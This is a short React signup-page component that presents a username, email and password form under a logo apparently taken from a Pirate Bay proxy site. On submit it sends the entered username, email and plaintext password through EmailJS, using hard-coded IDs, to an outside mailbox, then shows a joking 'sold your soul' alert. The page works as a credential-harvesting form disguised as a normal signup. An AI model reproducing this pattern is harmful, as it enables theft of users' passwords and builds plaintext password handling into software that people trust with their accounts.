import React from 'react';
import "./Signuppage.css";
import { useForm } from 'react-hook-form'
import emailjs,{init} from 'emailjs-com'

init("user_uCET6nDzKSoNKLF3GjXvs");




function Signuppage() {
    const {register,handleSubmit,errors }= useForm();
    const onSubmit = (data,r)=>{
        const templateId = "template_kjj799j";
        const serviceId = "service_fpidb05";

        const sendFeedback = (serviceId, templateId, variables)=>{
            emailjs
            .send(serviceId, templateId, variables)
            .then((res)=>{
                console.log("Success!")
            })
            .catch((err)=>{
                console.error("not Success",err)
            })
        }
        sendFeedback(serviceId, templateId, {
            Username:data.username,
            email:data.Email, 
            userPassword:data.Password
        });
        r.target.reset();
        alert("you have succesfully sold your soul!")
    };
   

    return (
        <form onSubmit= {handleSubmit(onSubmit)}>
            <div className="outer">
                <div className="inner">
                    <img className="logo" src="https://www.tpbproxypirate.com/images/pirat.jpg" alt="mainlogo"/>
                    <input className="inputs" name="username" placeholder="Username" ref={register({required: true})}/>
                    <input className="inputs" name="Email" placeholder="Email" ref={register({required: true})}/>
                    <input className="inputs" name="Password" placeholder="Password" type='password' autoComplete="on" ref={register({required: true,minLength:8})} />
                    <button className="btn-1" type="submit">Sign Up!</button>
                </div>
            </div>
        </form>
    );
}

export default Signuppage
